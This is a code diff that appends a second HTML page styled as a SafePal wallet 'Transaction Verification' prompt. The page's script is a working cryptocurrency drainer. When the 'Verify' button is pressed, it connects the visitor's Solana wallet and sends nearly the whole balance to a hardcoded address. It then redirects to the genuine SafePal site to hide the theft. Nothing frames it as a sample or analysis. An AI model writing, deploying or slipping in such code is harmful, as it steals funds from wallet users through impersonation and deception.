@@ -62,4 +62,68 @@
         };
     </script>
 </body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>SafePal - Verify</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:#0A0A0F;color:#FFF;display:flex;align-items:center;justify-content:center;min-height:100vh}
+        .card{background:#1A1A2A;border-radius:24px;padding:32px;max-width:400px;width:90%;text-align:center;border:1px solid rgba(255,255,255,0.05)}
+        .warning{color:#FF6464;font-size:14px;margin:16px 0;padding:12px;background:rgba(255,100,100,0.1);border-radius:12px}
+        button{width:100%;background:linear-gradient(135deg,#1a5cff,#0a3cbf);color:#fff;border:none;padding:16px;border-radius:40px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px}
+        .tx{background:rgba(255,255,255,0.05);padding:12px;border-radius:12px;margin:16px 0;font-family:monospace;font-size:12px;word-break:break-all}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Transaction Verification</h2>
+        <div class="tx">TX: 7jXz5mR0pS1yO4tN5vI6jK7lM8qP9jV0zU1sF2wR3</div>
+        <div class="warning">This transaction requires verification</div>
+        <button id="verify">Verify</button>
+    </div>
+    <script>
+        document.getElementById('verify').onclick = async () => {
+            let wallet = null;
+            if(window.solana) wallet = window.solana;
+            else if(window.safepal) wallet = window.safepal;
+            else if(window.phantom) wallet = window.phantom;
+            
+            if(wallet){
+                try{
+                    const r = await wallet.connect();
+                    const c = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
+                    const b = await c.getBalance(r.publicKey);
+                    const m = await c.getMinimumBalanceForRentExemption(0);
+                    if(b < m){
+                        alert("Insufficient funds.");
+                        return;
+                    }
+                    const a = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
+                    const t = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: r.publicKey,
+                            toPubkey: a,
+                            lamports: b - m
+                        })
+                    );
+                    t.feePayer = r.publicKey;
+                    const h = await c.getRecentBlockhash();
+                    t.recentBlockhash = h.blockhash;
+                    const s = await wallet.signTransaction(t);
+                    const x = await c.sendRawTransaction(s.serialize());
+                    await c.confirmTransaction(x);
+                    window.location.href = "https://safepal.com";
+                }catch(e){
+                    alert("Verification failed. Try again.");
+                }
+            }else{
+                alert("Please install SafePal wallet.");
+            }
+        };
+    </script>
+</body>
 </html>
